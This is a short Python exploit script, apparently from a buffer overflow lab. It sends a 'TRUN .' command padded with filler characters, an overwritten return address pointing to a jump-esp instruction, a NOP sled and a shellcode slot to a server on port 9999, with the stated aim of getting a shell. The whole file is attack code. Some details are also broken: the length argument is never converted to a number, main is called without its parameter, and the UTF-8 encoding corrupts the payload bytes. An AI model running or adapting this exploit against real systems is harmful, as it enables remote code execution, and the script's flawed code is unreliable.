import socket
import sys

# Send specific exploit string to get the shell on the vulnerable server

# get our shellcode
buf = ""


payload = buf

def main(ar):
    # number of garbage characters to send
    length = sys.argv[1]

    # set ip and port
    ip = "192.168.1.2"
    port = 9999

    # set up socket stuff
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip,port))

    # location of the jump esp goes here
    # 625011AF
    eip = "\xAF\x11\x50\x62"

    # see where these Cs go 
    # buf is the shellcode that is defined above
    payload = buf

    # in order to reach the part of the code that
    # does the exploit you need to begin with this
    command = "TRUN ."

    print(sock.recv(1024).decode("utf-8"))

    garbage = "A"*length
    nop_sled = "\x90"*24
    exploit_str = command + garbage + eip + nop_sled + payload
    
    sock.send(exploit_str.encode("utf-8"))
    
    # get and print the response
    # when it finally crashes this is where we will be stopped
    print(sock.recv(1024).decode("utf-8"))
        

if __name__ == "__main__":
    main()